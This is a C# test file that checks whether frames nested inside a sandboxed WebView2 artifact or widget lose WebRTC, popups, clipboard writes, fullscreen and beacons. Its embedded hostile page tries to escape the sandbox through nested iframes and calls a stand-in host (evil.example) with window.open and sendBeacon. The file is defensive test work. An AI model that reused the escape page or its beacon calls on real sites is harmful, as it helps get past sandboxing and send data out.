using System.Text.Json.Nodes;
using Marrow.App.Tests.Fixtures;

namespace Marrow.App.Tests.Window.Native;

// Security review 2026-10-13, finding M5, the native part (ED-NEW-web-sec-artifacts-2; DESIGN 6.5 "WebRTC ... deleted ... before
// any page script runs", 13.4). Write but NEVER run as an implementing agent: the lead takes native.lock and schedules each Fact
// alone. A hostile page in a real WebView2 builds frames inside frames through each frame's own document (appendChild, innerHTML,
// document.write, a contextual fragment) and reaches them through window[0], contentWindow and contentDocument in the same task,
// before any microtask: none keeps RTCPeerConnection, and the inner frames lose window.open, script clipboard writes and
// fullscreen too. Run for the artifact and the inline widget, as SandboxEscapeNativeTests does.
[Collection("WindowManagerNative")]
[Trait("Decision", "ED-NEW-web-sec-artifacts-2")]
public sealed class SandboxNestedFrameNativeTests(WindowManagerNativeSession native)
{
    private const string Nested = """
        <!doctype html><html><head><meta charset="utf-8"><title>nested</title></head><body><script>
        (async () => {
          const r = { frames: {}, inner: {} };
          const rtc = (w) => { try { return typeof w.RTCPeerConnection; } catch (e) { return 'unreachable'; } };
          const a = document.createElement('iframe');
          document.body.appendChild(a);
          const da = a.contentDocument;
          const b = da.createElement('iframe');
          da.body.appendChild(b);
          r.frames.appended = rtc(window[0][0]);
          da.body.insertAdjacentHTML('beforeend', '<iframe></iframe>');
          r.frames.html = rtc(window[0][1]);
          const db = window[0][0].document;
          db.open(); db.write('<!doctype html><body><iframe></iframe></body>'); db.close();
          r.frames.written = rtc(window[0][0][0]);
          da.body.appendChild(da.createRange().createContextualFragment('<iframe></iframe>'));
          r.frames.fragment = rtc(window[0][2]);
          const c = da.createElement('iframe');
          da.body.appendChild(c);
          r.frames.contentWindow = rtc(c.contentWindow);
          r.frames.deep = rtc(c.contentDocument.body.appendChild(c.contentDocument.createElement('iframe')).contentWindow);
          const inner = window[0][0];
          r.inner.open = String(inner.open('https://evil.example/'));
          try { new inner.RTCPeerConnection(); r.inner.made = 'made'; } catch (e) { r.inner.made = e.name; }
          r.inner.copy = String(inner.document.execCommand('copy'));
          try { await inner.navigator.clipboard.writeText('secret'); r.inner.clipboard = 'wrote'; } catch (e) { r.inner.clipboard = e.name; }
          try { await inner.document.body.requestFullscreen(); r.inner.fullscreen = 'entered'; } catch (e) { r.inner.fullscreen = e.name; }
          r.inner.beacon = String(inner.navigator.sendBeacon('https://evil.example/b', 'x'));
          document.title = 'nth-escape:' + JSON.stringify(r);
        })();
        </script></body></html>
        """;

    [Fact]
    public void Frames_built_inside_an_artifacts_frames_have_no_webrtc_on_the_real_engine() => native.Run(_ => Check("artifact"), factType: typeof(SandboxNestedFrameNativeTests));

    [Fact]
    public void Frames_built_inside_an_inline_widgets_frames_have_no_webrtc_on_the_real_engine() => native.Run(_ => Check("widget"), factType: typeof(SandboxNestedFrameNativeTests));

    private void Check(string surface)
    {
        var rig = native.OnUi(() => new SandboxEscapeNativeRig(native, surface, Nested));
        try
        {
            WindowManagerNativeMethods.Until(() => native.OnUi(() => rig.Report(0)) is not null, "The nested page never reported.", 30000);
            var report = JsonNode.Parse(native.OnUi(() => rig.Report(0))!)!.AsObject();
            foreach (var (frame, value) in report["frames"]!.AsObject())
                Assert.True(value?.GetValue<string>() == "undefined", $"{surface}: the {frame} frame kept WebRTC ({value})");
            var inner = report["inner"]!.AsObject();
            Assert.Equal("null", inner["open"]!.GetValue<string>());
            Assert.NotEqual("made", inner["made"]!.GetValue<string>());
            Assert.Equal("false", inner["copy"]!.GetValue<string>());
            Assert.NotEqual("wrote", inner["clipboard"]!.GetValue<string>());
            Assert.NotEqual("entered", inner["fullscreen"]!.GetValue<string>());
            Assert.Equal("false", inner["beacon"]!.GetValue<string>());
        }
        finally
        {
            native.OnUi(rig.Dispose);
        }
    }
}
